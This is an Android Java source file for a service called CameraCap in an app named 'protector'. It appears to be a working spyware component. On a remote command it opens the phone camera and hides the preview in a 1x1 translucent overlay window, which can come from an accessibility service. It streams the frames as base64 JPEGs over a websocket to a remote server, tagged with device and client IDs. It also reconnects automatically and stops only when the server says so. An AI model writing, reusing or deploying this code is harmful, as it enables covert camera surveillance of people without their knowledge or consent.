package com.icontrol.protector;

import static com.icontrol.protector.WorkServices.MyWorker.AlertServer;
import static com.icontrol.protector.Consts.URL_SOCKT;

import android.app.Notification;
import android.app.Service;

import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.graphics.ImageFormat;
import android.graphics.PixelFormat;
import android.graphics.Rect;
import android.graphics.YuvImage;
import android.hardware.Camera;
import android.os.Build;
import android.os.IBinder;

import android.util.Base64;
import android.view.Gravity;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.Vector;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

public class CameraCap extends Service implements SurfaceHolder.Callback {
    public static Camera mycamera = null;


    public static WindowManager WindoManager;
    //public  SurfaceView serfaceV;
    public static WindowManager.LayoutParams MyLayout;
    public static boolean Camused = false, ctd = false;
    private List<byte[]> BytsArry = new ArrayList<byte[]>();
    private static Object Lockobj = new Object();
    public static String CommandData;

    public static WindowManager.LayoutParams Win_Layout;

    public static WindowManager Win_Manage;
    public SurfaceView Srf_Vew;
    //CameraCap currentinstns;

    public static String load() {
        String Response = "";
        try {
            Camera cm = Camera.open(0);
            List<Camera.Size> tmpList = cm.getParameters().getSupportedPreviewSizes();

            final List<Camera.Size> sizeList = new Vector<>();


            for (int i = 0; i < tmpList.size(); i++) {

                String size = "[" + String.valueOf(tmpList.get(i).width) + "x" + String.valueOf(tmpList.get(i).height) + "],";
                //Log.e("Size :",size);
                Response += size;
//
            }
        } catch (Exception a) {
        }
        return Response;
    }

    private static int Notifi_ID = 111;

    private void startforground(Context ctx) {
        try {
            // int Notifi_ID = UtliTools.randomnumber(11111, 88888);
            MyNotification MyNotifiint = MyNotification.getInstance(ctx);
            Notification notification = MyNotifiint.createNotification(ctx);
            if (Build.VERSION.SDK_INT >= 34) {
                this.startForeground(Notifi_ID, notification,
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
            } else {
                this.startForeground(Notifi_ID, notification);
            }
        } catch (Exception a) {
        }


    }


    @Override
    public void onCreate() {
        super.onCreate();

        Context ctx = getApplicationContext();
        startforground(ctx);
    }

    public static final String ACTION_STOP_CAM = "ACTION_STOP_C";

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        try {
            if (intent != null) {
                String action = intent.getAction();
                if (action != null && action.equals(ACTION_STOP_CAM)) {
                    killall();
                    stopForeground(false);

                    // Stop the foreground service.
                    stopSelf();
                    return START_NOT_STICKY;
                }
            }

            Context ctx = getApplicationContext();
            startforground(ctx);
            String Dataintent = "CData";
            if (intent != null) {
                if (intent.hasExtra(Dataintent)) {
                    if (AccessServices.AccessWindow != null && AccessServices.AccessLayout != null) {
                        CommandData = intent.getStringExtra(Dataintent);
                        Camused = ck();
                        if (Camused == false) {

                            Srf_Vew = new SurfaceView(getApplicationContext());

                            AccessServices.AccessLayout.gravity = Gravity.LEFT | Gravity.TOP;
                            AccessServices.AccessWindow.addView(Srf_Vew, AccessServices.AccessLayout);
                            Srf_Vew.getHolder().addCallback(this);
                            ConnectCam(ctx);
                        } else {

                            AlertServer(ctx, "Camera start fail", "Camera in use By another App");
                            ReleaseAll(ctx);

                            return START_NOT_STICKY;
                        }
                    } else {
                        CommandData = intent.getStringExtra(Dataintent);
                        Camused = ck();
                        if (Camused == false) {
                            Win_Manage = (WindowManager) this.getSystemService(Context.WINDOW_SERVICE);
                            Srf_Vew = new SurfaceView(getApplicationContext());

                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                Win_Layout = new WindowManager.LayoutParams(
                                        1, 1,
                                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                                        WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                                                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                                        PixelFormat.TRANSLUCENT
                                );

                            } else {
                                Win_Layout = new WindowManager.LayoutParams(
                                        1, 1,
                                        WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
                                        WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                                        PixelFormat.TRANSLUCENT
                                );
                            }
                            Win_Layout.gravity = Gravity.LEFT | Gravity.TOP;
                            Win_Manage.addView(Srf_Vew, Win_Layout);
                            Srf_Vew.getHolder().addCallback(this);
                            ConnectCam(ctx);
                        } else {
                            AlertServer(ctx, "Camera start fail", "Camera in use By another App");
                            ReleaseAll(ctx);

                            return START_NOT_STICKY;
                        }
                    }
                }
            }
            return START_STICKY;
        } catch (Exception e) {
        }
        return START_NOT_STICKY;
    }


    public boolean ck() {
        Camera c = null;
        try {
            c = Camera.open();
        } catch (RuntimeException e) {
            return true;
        } finally {
            if (c != null) {
                c.release();
            }
        }
        return false;
    }

    public static boolean camlive = true;
    public void ConnectCam(Context ctx) {
        new Thread(new Runnable() {
            @Override
            public void run() {

                client = new OkHttpClient();
                Request request = new Request.Builder().url(URL_SOCKT()).build();
                ws = client.newWebSocket(request, new WebSocketListener() {


                    @Override
                    public void onClosing(@NonNull WebSocket webSocket, int code, @NonNull String reason) {
                        super.onClosing(webSocket, code, reason);
                        if (camlive){
                            camlive =false;
                            //new Thread(() -> {
                            try {
                                Thread.sleep(3000);
                            } catch (InterruptedException e) {
                                e.printStackTrace();
                            }
                            ConnectCam(ctx);
                            //}).start();

                        }
                    }

                    @Override
                    public void onFailure(@NonNull WebSocket webSocket, @NonNull Throwable t, @Nullable Response response) {
                        super.onFailure(webSocket, t, response);
                        if (camlive){
                            camlive =false;
                            //new Thread(() -> {
                            try {
                                Thread.sleep(3000);
                            } catch (InterruptedException e) {
                                e.printStackTrace();
                            }
                            ConnectCam(ctx);
                            //}).start();

                        }
                    }

                    @Override
                    public void onOpen(WebSocket webSocket, Response response) {
                        Thread thread = new Thread() {
                            @Override
                            public void run() {
                                try {
                                    ctd = true;
                                    camlive = true;
                                    String conctkey = MySettings.Read(ctx,Consts.Redirect_k,My_Configs.CONS_KY);
                                    while (camlive) {
                                        try {
                                            byte[] pc = null;
                                            try {
                                                synchronized (CameraCap.Lockobj) {
                                                    if (BytsArry.size() > 0) {
                                                        pc = (byte[]) BytsArry.get(0);
                                                        BytsArry.remove(0);
                                                    }
                                                }
                                            } catch (Exception e) {
                                            }
                                            try {
                                                Camera.Parameters prm = CameraCap.mycamera.getParameters();
                                                int wid = prm.getPreviewSize().width;
                                                int Hig = prm.getPreviewSize().height;
                                                YuvImage yuv = new YuvImage(pc, ImageFormat.NV21, wid, Hig, null);
                                                ByteArrayOutputStream out0 = new ByteArrayOutputStream();


                                                yuv.compressToJpeg(new Rect(0, 0, wid, Hig), Qulty, out0);
                                                byte[] imageData = out0.toByteArray();

                                                try {


                                                    String base64Image = Base64.encodeToString(imageData, Base64.DEFAULT);

                                                    JSONObject jsonObject = new JSONObject();
                                                    jsonObject.put("type", "cam");
                                                    jsonObject.put("img", base64Image);
                                                    jsonObject.put("cuz", "v");

                                                    String jsonData = jsonObject.toString();


                                                    Livemessage(ctx, jsonData, conctkey);
                                                } catch (Exception e) {
                                                    //killall();

                                                }


                                                out0.close();

                                            } catch (Exception ee) {
                                            }

                                        } catch (Exception e) {
                                        } catch (OutOfMemoryError e) {
                                        }
                                        try {
                                            Thread.sleep(1);
                                        } catch (InterruptedException e) {
                                        }
                                    }
                                } catch (Exception ex) {
                                    ex.printStackTrace();
                                }
                            }
                        };
                        thread.start();

                    }

                    @Override
                    public void onMessage(WebSocket webSocket, String text) {
                        super.onMessage(webSocket, text);
                        try {
                            JSONObject Response = new JSONObject(text);
                            String msgtype = Response.optString("type", "empty");
                            if (msgtype.equals("stop") ||
                                    msgtype.equals("Unauthorized access")) {
                                killall();
                            }
                        } catch (Exception a) {
                        }
                    }


                });
            }
        }).start();
    }
    public void killall() {
        camlive = false;
        ReleaseAll(getApplicationContext());
        try {
            if (ws != null) {
                ws.cancel();
                ws = null;
            }
            if (client != null) {
                client.dispatcher().cancelAll();
                client.connectionPool().evictAll();
                client.dispatcher().executorService().shutdown();
                client = null;
            }
        } catch (Exception s) {

        }
//        Context ctx = getApplicationContext();
//        if (MyCods.isServiceRunning(ctx, CameraCap.class)) {
//            Intent Cameraint = new Intent(ctx, CameraCap.class);
//            ctx.stopService(Cameraint);
//        }

    }
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private int Qulty = 70;


    private String Clientid;

    //CommandData = [type = 0/1] , [width] , [height] , [quality]

    @Override
    public void surfaceCreated(SurfaceHolder surfaceHolder) {
        String[] command = CommandData.split(",");
        try {

            CameraCap.mycamera = Camera.open(Integer.valueOf(command[0]));
        } catch (RuntimeException e) {
        }
        try {
            Camera.Parameters parameters = CameraCap.mycamera.getParameters();
            Camera.Size bestSize = null;
            if (CameraCap.mycamera.getParameters().getSupportedPreviewSizes() != null) {
                Camera.Parameters p = CameraCap.mycamera.getParameters();
                List<Camera.Size> s = p.getSupportedPreviewSizes();
                for (Camera.Size z : s) {
                    if (z.width > 600 && z.height > 400) {
                        bestSize = z;
                    }
                }
            }
            try {
                if (command.length > 1) {
                    bestSize.width = Integer.valueOf(command[1]);
                    bestSize.height = Integer.valueOf(command[2]);
                    Qulty = Integer.valueOf(command[3]);
                }

            } catch (Exception a) {
                bestSize.width = 0;
                bestSize.height = 0;
            }

            if (bestSize.width == 0 || bestSize.height == 0) {
                bestSize.width = 640;
                bestSize.height = 480;
            }

            List<String> fu = parameters.getSupportedFocusModes();
            if (fu.contains(Camera.Parameters.FOCUS_MODE_CONTINUOUS_VIDEO)) {
                parameters.setFocusMode(Camera.Parameters.FOCUS_MODE_CONTINUOUS_VIDEO);
            }

            Clientid = command[4];

            parameters.setPreviewSize(bestSize.width, bestSize.height);
            parameters.setPreviewFormat(ImageFormat.NV21);
            CameraCap.mycamera.setParameters(parameters);
            CameraCap.mycamera.setPreviewDisplay(surfaceHolder);

            CameraCap.mycamera.startPreview();

        } catch (Exception e) {
        }
    }

    @Override
    public void surfaceChanged(SurfaceHolder surfaceHolder, int format, int width, int height) {
        if (CameraCap.mycamera != null) {
            CameraCap.mycamera.setPreviewCallback(new Camera.PreviewCallback() {
                public void onPreviewFrame(byte[] b, Camera _camera) {
                    try {
                        try {
                            if (b == null) {
                                return;
                            }
                            if (ws != null && ctd == true && client != null) {
                                if (BytsArry.size() <= 15) {
                                    synchronized (Lockobj) {
                                        BytsArry.add(b);
                                    }
                                }
                            }
                        } catch (OutOfMemoryError e) {
                        }
                    } catch (Exception e) {
                    }

                }
            });
        }
    }

    private OkHttpClient client;
    public static WebSocket ws;

    //Sending Data to nodejs for realtime activity
    private void Livemessage(Context ctx, String msg,String conctkey) {
        if (ws != null) {

            try {


                String Myid = MySettings.Read(ctx, Consts.DEVICE_ID, "Deviceid");
                // String IDF = MySettings.Read(ctx, Consts.THE_IDF, null);

                if (Myid == null) {
                    return;
                }
//                if (IDF == null) {
//                    return;
//                }

                String CIP = MySettings.Read(ctx, Consts.THE_CIP, "null");


                JSONObject message = new JSONObject();
                // message.put("userId", userid);
                message.put("idf", Clientid);
                message.put("pid", Myid);
                message.put("itype", "Slr_client");
                message.put("subc", "msg");
                message.put("msg", msg);
                message.put("cip", CIP);

                message.put("conk", conctkey);
                // Send the JSON message as a string
                ws.send(message.toString());
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
    }

    @Override
    public void surfaceDestroyed(SurfaceHolder surfaceHolder) {
    }

    public void onDestroy() {
        super.onDestroy();



        if (ws != null) {
            ws.close(1000, "Closing");
        }
    }

    public void ReleaseAll(Context ctx) {
        try {

            if (CameraCap.mycamera != null) {
                CameraCap.mycamera.setPreviewCallback(null);
                CameraCap.mycamera.release();
                CameraCap.mycamera = null;
            }
            ctd = false;

            Camused = false;
        } catch (Exception e) {

        }
        try {
            if (AccessServices.AccessWindow != null && AccessServices.AccessLayout != null) {
                if (Camused == false) {
                    try {
                        if (Srf_Vew != null && Srf_Vew.getWindowToken() != null) {
                            Srf_Vew.getHolder().removeCallback(this);
                            AccessServices.AccessWindow.removeView(Srf_Vew);
                            Srf_Vew = null;
                        }

                    } catch (Exception ss) {
                    }
                }
            } else {
                if (Srf_Vew != null && Srf_Vew.getWindowToken() != null) {
                    try {
                        // Remove the SurfaceHolder callback if you added one
                        Srf_Vew.getHolder().removeCallback(this);

                        // Remove the view from WindowManager
                        Win_Manage.removeView(Srf_Vew);
                    } catch (Exception e) {
                        e.printStackTrace(); // Log errors if removal fails
                    } finally {
                        // Null references to help GC
                        Srf_Vew = null;
                        Win_Manage = null;
                        Win_Layout = null;
                    }
                }
            }

        } catch (Exception s) {
        }

//        try {
//            if (currentinstns != null) {
//                currentinstns.stopSelf();
//            }
//        } catch (Exception a) {
//        }

        // Intent i = new Intent(ctx, CameraCap.class);
        // ctx.stopService(i);
    }

}
